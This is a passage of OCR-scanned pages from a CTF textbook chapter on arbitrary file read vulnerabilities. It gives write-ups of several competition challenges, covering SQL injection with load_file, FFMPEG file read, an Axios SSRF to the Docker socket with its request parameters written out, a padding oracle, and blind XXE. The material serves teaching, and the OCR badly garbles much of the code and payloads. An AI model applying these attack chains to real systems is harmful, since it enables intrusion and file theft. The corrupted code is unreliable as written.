will not be introduced in detail here.
1.3.3.9 Comment (NetDing Cup 2018 Online)
[Intro】 It starts with a login page, as shown in Fig. 1.84. On the challenge website, it
is found that there is a .git directory. The program's source code can be restored
through the GitHack tool, and the restored source code can be audited. It is found
that there is a secondary injection, as shown in Fig. 1.85.
---
## Page 85
1.3 Arbitrary File Read Vulnerability
69
Sign in
zhangwei
zhangwej**+
Signin
Fig, 1.84 Login form
nt':
$bo_id
=addslashes($_POST['bo_id']);
拼接
$sql =
"select category from board where ida*$bo_id*";
$result =mysql_query($sql);
获取行数
mysql_num_rows ($result);
if（$num0）（
#如果大于
#从结果集中取得一
Scategory
Scontent=:
addslashes($_posT['content*]);
set
'Scate
y'
$result=
Fig, 1.85 Source code
[Difficulty 】 Moderate.
【Knowledge】 Source code leakage caused by the undeleted .git directory; sec-
ondary injection (MySQL); read file content through injection vulnerability
(load_file) (.bash_history->.DS_Store->lag)
【Challenge solving】 BurpSuite’s Intruder module is used to brute force 3 bytes
after the password, and the parameter settings are shown in Fig. 1.86.
Restore the application source code through the leak of the git directory, and find
SQL injection (secondary injection) through auditing the source code, and exploit
the injection vulnerability, but it is found that there is no flag in the database; try to
use load_file to read the content of the /etc/passwd file, and it succeeds. Record the
---
## Page 86
70
1 Introduction to the Web
Fig, 1.86 The parameter st
username www and its workdir: /home/www/; read /home/www/.bash_history to
find the server’s history commands:
cd /tmp/
rm -f html .2ip
unzip html.zip
/AAA/xe△/twu x-do
/tuaq/nnn/xea/ po
sezvice apache2 start
rm -f .DS_Store
According to the hint of the content of the .bash_history file, read /tmp/.
DS_Store, find and read the flag file flag_ 8946e1fflee3e40f.php (note that the
load_file result needs to be encoded here, such as using the hex function of MySQL).
[Summary】 This challenge is a typical file reading and exploiting chain. After
exploiting MySQL injection, more directory information must be leaked through .
bash_history and then read other files in the collected information.
1.3.3.10 The Ark Project (CISCN 2017)
[Intro】 The service of this challenge includes registration and login functions. After
logging in with the administrator account, you can upload AVI files and automati-
cally convert the uploaded AVI files into MP4 files.
[Difficulty】 Easy.
【Knowledge】 Use inline comments to bypass SQL injection WAF; exploiting a
vulnerability of FFMPEG to read arbitrary files.
 a   q     [os ]
registration functions, first try SQL injection. Through black-box testing, it is found
---
## Page 87
1.3 Arbitrary File Read Vulnerability
71
.
Fig, 1.87 Bypuss WAF
Fig, 1.88 Result
root:x:0:0:root:/root:/bi
n/bash0s0m3b0dy:x:1001:1001::/h0
body:daemon:x:1:1:d
emon:/usr/sbin:/usr/sbin/nologi
obin:x:2:2:
bin:/bin:/usr/s
bin/nologing
sys:x:3:3:sys:/dev:
usr/sbin/nol
Fig, 1.89 Get flag
6FAn0GmCb8rg
flagfU8I6y5hRfmn5MOUiR8im
日
oflagfU8
I6y5hRfmm5MoUiR8im6FAnOGmCb8rg）
日
fla
gfU8I6y5hRfmn5M0UiR8im6FAn0GmCb8
in-depth exploitation, it will be found that there is WAF, and then use inline
comments to bypass WAF (/ *150001select*/), see Fig. 1.87.
Continue to obtain data through the injection vulnerability, obtain the adminis-
trator account, encrypted password, and encryption key (st_key), and obtain the
plaintext password through AES decryption.
Use the injected usermame and password to log in to the administrator account and
find the video format conversion function on the administrator page. It is guessed
that the content of the challenge is an arbitrary file reading vulnerability of FFMPEG.
Use a known exploit script to generate a malicious AVI file and upload it,
download the converted video, and play the video to find that the file content (/etc/
passwd) can be successfully read, as shown in Fig. 1.88.
According to the contents of the /etc/passwd file, we found that there is a user
named s0m3body, and guessed that the flag is in his user directory, i.e., /home/
s0m3b0dy/flag(.txt); continued to read the ffag through the FFMPEG file reading
vulnerability, and found that the flag was successfully obtained, see Fig. 1.89.
---
## Page 88
1 Introduction to the Web
return Svalue:
function check_emoji name(Svalue
if（!preg_match（
[6-0Z-VZ-e]/
return Svalue:
action
str($length=16）（
xedcrfvtgbyhnujmik1op0987654321
srane
NULL:
$S
fortsi
len($li)-1）]
$s
return Ss
Fig, 1.90 Result
[Summary】 ① This challenge uses a typical method of bypassing SQL injection
WAF (inline comments).
② This challenge closely follows hot security issues, and the results of reading files
are presented in a novel and interesting way. The principle of the FFMPEG
arbitrary file reading vulnerability is mainly that the HLS (HTTP Live Streaming)
protocol supports the File protocol, which leads to the ability to read files into the
video.
Another distinctive file reading and presentation effect competition is the 2018
Nanjing University of Posts and Telecommunications Competition, which chal-
lenged the use of PHP to generate pictures dynamically. The file's content read by
the file reading vulnerability can be attached to the picture when exploiting. See
Fig. 1.90.
1.3.3.11 PrintMD (RealWorldCTF 2018 Online)
【Intro】 The function provided by the challenge can render the content of the online
editor Markdown (hackmd) into a printable form. Rendering methods are divided
into client-side local rendering and server-side remote rendering.
The client can perform local debugging, and the code for the remote rendering
part of the server is as follows:
---
## Page 89
1.3 Arbitrary File Read Vulnerability
73
( sso.xppe,) axrnbax = (xoqnog] suo>
/ / render-j=
const {matchesUA) = require [*browserslist-useragent′)
const router = Router [)
const axios = require [*axios′)
const nd = require (' .-- / . . /plugins/md_srv)
router,post (′/render', function [req, res, next) {
ret .ssr = ImatchestA (req, body -ua, 
let ret = {}
brovsers: ["last 1 version", *> 1v", *IE 1o"] ,
_allovHigherVersions: true
if (xet.ssr) {
axios (reg.body -ur1) then (r => 
ret .mdbody = md.render (x ,data)
})
res .json (zet)
else {
ret ,ndbody = nd.render (*# Please wait.. . ')
res-json (ret)
module exports = router
The Docker environment exists on the server, and the Docker service is started.
The path of the ffag on the server is /flag.
[Difficulty 】 Difficult.
【Knowledge】 JavaScript prototype pollution; Axios SSRF (UNIX Socket) attack
on Docker API to read local files.
[Challenge solving】 Audit the client-side code obfuscated by Webpack, find the
logic related to server-side communication in the application, and de-obfuscate the
obfuscated code. The source code obtained is as follows:
validate: function (e) {
return e.query-ur1 s& e.query-ur1 . starswith (*https: //hacknd. io/*)
asyncData: funetion (ctx) {
if (1ctx. query uz1 .endsnith(*/dounload") {
ctx.quexy-ur1 += */download*;
* II [auafe -xasn,] sxaprau bax*xo = en *Axonb*xo
return axios-post (*/api/render", qs.stringify ({ -.. . ctx.query)11 -
then (function (e) {
return {
... .e.data,
url : ctx.query.ur1
---
## Page 90
L
1  Introduction to the Web
mounted: function () {
if (ithis.ssr){
axios (this ur1) . then (function (t) (
this.mdbody = md.render (t data)
})
Then use HTTP parameter pollution to bypass the restrictions of startsWith, and
at the same time, use prototype pollution on req.body.url (server), so that the server
Axios will be passed into the socketPath and url parameters when requesting. Then
use the SSRF vulnerability to attack the Docker API, pull /flag into the Docker
container, and call the Docker API to read the files in the Docker.
The specific attack process is as follows.
① pull a lightweight image docker pull alpine:latest= >:.
qsod= [poq4ow] [.xn
&ur1 [ur1]=http: //127 0. 0 .1/images/create?fromImage=alpine:1atest
&ur1=https : //hacknd. io/aaa
&ur1 [socketPath] =/var/run/docker.sock
② create a container docker create -v /flag:/flagindocker alpine -entrypoint /bin/sh"
-name ctf alpine: latest=> :
qsod= [poqaw] [xn
&ur1 [ur1]=http://127, 0.0 .1/containers/create7name=ctf
&ur1 [data] [Image] =alpine :1atest
&ur1 [data] [Volumes][flag][path] =/flagindocker
&ur1 [data] [Binds] [] =/flag:/flagindocker:ro
qs/uq/= [1 [auod/xqug] [eep] [xmy
&ur1 [socketPath] =/var/run/docker.sock
&ur1=https : / /haclknd. 1o/aaa
Start the container docker start ctf:
ur] [method] =post
&ur1 [ur1]=http://127 0.0 .1/containers/ctf/start
&ur1 [socketPath] =/var/run/docker,sock
&ur1=https : //hackmd. io/aaa
Retrieve the flag file in the docker.
ur] [method] =get
&uz1 [uz1] =http://127, 0.0 .1/containers/ctf/azchive?path=/
flagindocker
&ur1 [socketPath] =/var/run/docker.sock
&ur1=https : //hackmd. io/aaa
---
## Page 91
1.3 Arbitrary File Read Vulnerability
75
【Summary】 The challenge is very delicate and novel. Because Axios does not
support the File protocol, players need to use SSRF to control other applications on
the server to read files.
Similar to the Axios module, which can carry out UNIX Socket communication, 
there is also the curl component.
1.3.3.12 The Careless Jia Jia (PWNHUB)
【Intro】 The entrance is a Drupal service. Through collecting information, it is found
that the FTP service is opened on port 23 of the server, and the FTP service has a
weak password. After using the weak password to log in to FTP, it is found that there
is Drupal plug-in source code in the FTP directory, and there is SQL injection
vulnerability in the Drupal plug-in, and there was a Windows computer in the
intranet, and port 80 (Web service) was opened.
[Difficulty 】 Moderate.
【Knowledge】 Padding Oracle Attack; Drupal 8.x Deserialization Vulnerability;
Special Exploitation Techniques for Windows PHP Local File Inclusion/Reading.
【Challenge solving】 According to the challenge hint, the FTP login password
was violently cracked, and it was found that FTP has a weak login password.
An audit of the downloaded plug-in source code reveals a SQL injection vulner-
ability. Still, user input needs to be decrypted in AES-CBC mode before being
brought into SQL statements.
pzivate function set_decrypt ($id) {
1f (Sc = Base64decode (Base64decode ($id)) )
if ($iv = eubetr (Se, 0, 16))
if ($pass = substz ($c,17))
If (Su = openss1_decrypt (Spasa, KETHoD, S&CR&T_KEY,
OPENSSL_RAW_DATA, $iv)
return Su;
else
die ("hacker?*) ;
else
return 1;
else
return 1;
else
return 1;
---
## Page 92
76
1 Introduction to the Web
Firod:
Fig, 1L.91 Pading oracle attack
原谅社
页Hen
Adnir
Seareh
PI:EMAIL
Q
Fig, 1.92 Get email&password
public function get_by_id (Request Srequest) (
Snid = Srequest ->get (′id′1 ;
Snid = Sthis->set_decrypt ($nid) ;
Sthis->waf (Snid) ;
//echo Snid;
Squery = db_query I*sgL&cT nid, tit1e, body_value FRoM node_field_data
left
JOIN node__body oN node_field_data.nid=node_body ,entity_id
WHERE nid = (Snid) *) - >fetchAssoc () ;
return array(*#title* => Sthia->t ($query [′title*]) ,
#markup′ => ′′ Sthia->t ($query ['body_value′]) ' ′, 1 ;
By auditing the encrypted process, it was found that the secret text of the SQL
injection statement could be forged by the padding oracle attack, see Fig. 1.91, and
the SQL injection vulnerability continued to be exploited to get the users mailbox
and mailbox password, see Fig. 1.92.
Using the mailbox information to log in, we get the leaked online document
address in the mailbox, open it to restore the historical version, and find the admin
password. The recovered admin password is used for logging in the Drupal’s admin
system, and the information in the admin system determines the corresponding
version of Drupal, and a deserialization vulnerability is found. The result of
---
## Page 93
1.3 Arbitrary File Read Vulnerability
77
Fig, 1.93 phpinfo
constructing a deserialized payload for executing the phpinfo function is shown in
Fig. 1.93.
After getting the permission to execute arbitrary codes, the intranet could be
scanned, and it is found that there is a Windows host with Web service, and this Web
service includes a file reading vulnerability.
Continue to test and find a certain WAF. That is, files with dangerous file names
cannot be uploaded. Use " is equivalent to the regular wildcard **, *Warming1simplexml_1oad_string(): Bntity: 1ine 1:
b/var/ww/52dandan.oc/pub
11ne 54
Marning1simplexm1_1oad_string():61t?xm1
versios=squot;1.0bquot;encoding=&quotjutf-8&quot;?&gt; in
/var/wm/s2dandan,cc/publie_html/function.phpon
1ine 54
Fig, 1.94 Eror in the response
【Challenge solving】 By scanning the application directory of the website, it was
found that the idea/workspace.xml of the website could be leaked, and in
workspace.xml, there was a paragraph of XML entity variables that was commented.
The challenge only has one input point, comment, so we test whether there is an
XXE vulnerability (input XML header “
", it can be observed that there is an error in the response), see Fig. 1.94.
The existence of the XXE vulnerability is basically confirmed by the
pue *aessau roua supuodsauo o u umous toouny Sunspeofpxaduss
then an attempt is made to construct a remote entity call to implement the Blind
XXE exploit. The data of the constructed exploit is as follows.
xxe_1oca1=payload;  >#>
/4/d/ / : d. SAS x E# AIi>, uT s ALIIN1 >
$int;
strick;
According to the error message when testing the existence of XXE, you can find
the web directory location, read the source code of the web application using the
XXE vulnerability, and find that half of the flag content exists in the config.php file.
#/vaz/www/52dandan. ce/pub1ic_htm1/config php
?php
define (SEcRErFILE, * /vax/ww/52dandan., com/public_html/
youwi11neverknovthisfi1e_e2cd3614b63ccdcbfe7c